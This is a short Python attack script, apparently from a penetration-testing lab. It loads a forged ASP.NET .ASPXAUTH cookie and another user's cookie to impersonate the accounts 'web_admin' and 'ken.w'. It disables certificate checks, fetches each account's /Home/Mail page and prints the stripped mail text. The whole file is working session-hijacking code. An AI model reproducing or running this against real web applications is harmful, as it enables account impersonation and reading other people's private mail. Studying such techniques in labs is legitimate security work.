#!/usr/bin/env python3
import re, sys, requests, urllib3
urllib3.disable_warnings()

BASE = "https://10.129.242.196"

def sess(cookiefile):
    s = requests.Session(); s.verify = False
    s.headers["User-Agent"] = "Mozilla/5.0"
    s.cookies.set(".ASPXAUTH", open(cookiefile).read().strip(), domain="10.129.242.196")
    return s

def text(html):
    h = re.sub(r'<script.*?</script>', ' ', html, flags=re.S | re.I)
    h = re.sub(r'<style.*?</style>', ' ', h, flags=re.S | re.I)
    h = re.sub(r'<[^>]+>', ' ', h)
    h = h.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&#9881;', '')
    return re.sub(r'[ \t]+', ' ', h)

for name, f in [("web_admin", "/home/kali/hercules/forged.cookie"),
                ("ken.w", "/home/kali/hercules/ken.cookie")]:
    s = sess(f)
    r = s.get(f"{BASE}/Home/Mail", timeout=20)
    print(f"\n{'='*70}\n### {name}  /Home/Mail -> {r.status_code} len={len(r.text)}\n{'='*70}")
    t = text(r.text)
    # collapse blank lines
    lines = [l.strip() for l in t.splitlines()]
    lines = [l for l in lines if l]
    print("\n".join(lines))
